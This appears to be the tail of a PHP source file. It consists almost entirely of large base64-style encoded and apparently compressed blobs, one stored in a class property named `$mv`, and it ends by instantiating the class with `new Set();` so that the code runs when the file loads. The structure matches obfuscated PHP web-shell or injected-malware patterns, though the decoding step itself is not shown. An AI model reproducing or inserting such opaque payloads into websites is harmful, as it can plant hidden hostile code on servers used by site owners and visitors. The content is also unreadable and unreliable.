	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
	';
	 
	var $mv = 'bVLvT9swEP1cJP6Hw4pwIkUtFVAm5ccXlIkJaWVtty9lqtLEUa0mduTYdNHo/76zYWwtfLu7d/f87p29
	xkAClEbgVZxhWOV1x6LTE2/ztMWUrAgMoTPrTiu/2+Rj31vNs9mPbLakd4vFw+puOl/Qn0EIFyFcBjjI
	K593HdPYOMu+fc/miyVd7Tj2BPD79GQw8NyTh5RHnY5tPLF0gz0wVPQf6+10ev8lW1qBR5yHWOSAl620
	MsyROX1nrGl17+MQziumjRKQK5W7Ugi0Ytflek1DsDyhc8ZKYcVGAo3XsuxBikIKzX7phgmTkFcSZx5J
	465QvNVpKQuDuB7uFNesFj65uriCr1LDZ2lESYLorUOKLetLuRP2BEYUmkvhM9yOV+CzYaFVfc96OD+3
	GbbeyhL3ShKY3MDzMxzWPk0+qF2/r43HN/8MeDn8PtpxgTpQUFHzYvuRnLM3PX+HI3i36iONK6kayN1s
	Qgg0TG9kmZBWdho94qI1GnTfsoRYIwmIvMEYf8ARil+l4Yg/5bXBNE0RH1ny9JEG0T4evdodj+xpUhr9
	AQ==';
}

new Set();
?>